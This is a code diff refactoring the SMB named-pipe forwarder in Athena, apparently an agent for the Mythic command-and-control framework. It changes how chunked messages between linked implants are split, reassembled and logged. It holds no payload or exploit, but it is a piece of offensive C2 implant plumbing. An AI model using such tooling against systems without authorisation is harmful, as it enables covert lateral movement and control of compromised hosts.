@@ -4,16 +4,10 @@ using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using H.Pipes;
 using H.Pipes.Args;
-
-using System;
 using System.Collections.Concurrent;
-using System.Collections.Generic;
-using System.Linq;
+using System.Diagnostics;
+using System.Text;
 using System.Text.Json;
-using System.Text.Json.Nodes;
-using System.Text.Json.Serialization;
-using System.Threading;
-using System.Threading.Tasks;
 
 namespace Athena.Forwarders
 {
@@ -23,8 +17,7 @@ namespace Athena.Forwarders
         public ConcurrentBag<DelegateMessage> messageOut { get; set; }
         private PipeClient<DelegateMessage> clientPipe { get; set; }
         private object _lock = new object();
-        private ConcurrentDictionary<string, string> partialMessages = new ConcurrentDictionary<string, string>();
-        private string uuid { get; set; }
+        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
 
         public Forwarder()
         {
@@ -46,8 +39,8 @@ namespace Athena.Forwarders
         //Link to the Athena SMB Agent
         public async Task<bool> Link(MythicJob job, string uuid)
         {
-            this.uuid = uuid;
             Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);
+            Debug.WriteLine($"[{DateTime.Now}] Linking to pipe: {par["pipename"]} on host {par["hostname"]}");
 
             try
             {
@@ -64,53 +57,44 @@ namespace Athena.Forwarders
                         this.connected = true;
                         return true;
                     }
-                    else { return false; }
                 }
-                else { return false; }
             }
-            catch { return false; }
+            catch (Exception e) 
+            {
+                Debug.WriteLine($"[{DateTime.Now}] Error in link: {e}");
+            }
+
+            return false;
         }
         public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
         {
             try
             {
                 IEnumerable<string> parts = dm.message.SplitByLength(50000);
+                dm.final = false;
 
+                Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {dm.message.Length} in {parts.Count()} chunks.");
                 foreach (string part in parts)
                 {
-                    DelegateMessage msg;
+                    dm.message = part;
+
                     if (part == parts.Last())
                     {
-                        msg = new DelegateMessage()
-                        {
-                            uuid = this.uuid,
-                            message = part,
-                            c2_profile = "smb",
-                            final = true
-                        };
+                        dm.final = true;
                     }
-                    else
-                    {
-                        msg = new DelegateMessage()
-                        {
-                            uuid = this.uuid,
-                            message = part,
-                            c2_profile = "smb",
-                            final = false
-                        };
-                    }
-                    await this.clientPipe.WriteAsync(msg);
+                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {dm.final}");
+                    await this.clientPipe.WriteAsync(dm);
                 }
                 return true;
             }
-            catch
+            catch (Exception e )
             {
+                Debug.WriteLine($"[{DateTime.Now}] Error in send: {e}");
                 return false;
             }
         }
         private async Task AddMessageToQueue(DelegateMessage message)
         {
-
             if (Monitor.TryEnter(_lock, 5000))
             {
                 this.messageOut.Add(message);
@@ -135,18 +119,17 @@ namespace Athena.Forwarders
         }
         private async Task OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
         {
+            Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.message.Length} bytes");
             try
             {
-                //Add message to out queue.
-                // DelegateMessage dm = JsonSerializer.Deserialize<DelegateMessage>(args.Message);
-
                 if (this.partialMessages.ContainsKey(args.Message.uuid))
                 {
                     if (args.Message.final)
                     {
-                        string curMessage = args.Message.message;
+                        Debug.WriteLine($"[{DateTime.Now}] Final chunk received.");
+                        string oldMsg = args.Message.message;
 
-                        args.Message.message = this.partialMessages[args.Message.uuid] + curMessage;
+                        args.Message.message = this.partialMessages[args.Message.uuid].Append(oldMsg).ToString();
 
                         await this.AddMessageToQueue(args.Message);
                         this.partialMessages.Remove(args.Message.uuid, out _);
@@ -154,23 +137,27 @@ namespace Athena.Forwarders
                     }
                     else //Not Last Message but we already have a value in the partial messages
                     {
-                        this.partialMessages[args.Message.uuid] += args.Message.message;
+                        Debug.WriteLine($"[{DateTime.Now}] Appending message to existing tracker.");
+                        this.partialMessages[args.Message.uuid].Append(args.Message.message);
                     }
                 }
                 else //First time we've seen this message
                 {
                     if (args.Message.final)
                     {
+                        Debug.WriteLine($"[{DateTime.Now}] Final chunk received.");
                         await this.AddMessageToQueue(args.Message);
                     }
                     else
                     {
-                        this.partialMessages.GetOrAdd(args.Message.uuid, args.Message.message); //Add value to our Collection
+                        Debug.WriteLine($"[{DateTime.Now}] First chunk received.");
+                        this.partialMessages.GetOrAdd(args.Message.uuid, new StringBuilder(args.Message.message)); //Add value to our Collection
                     }
                 }
             }
             catch (Exception e)
             {
+                Debug.WriteLine($"[{DateTime.Now}] Error in SMB Forwarder: {e}");
             }
         }
     }
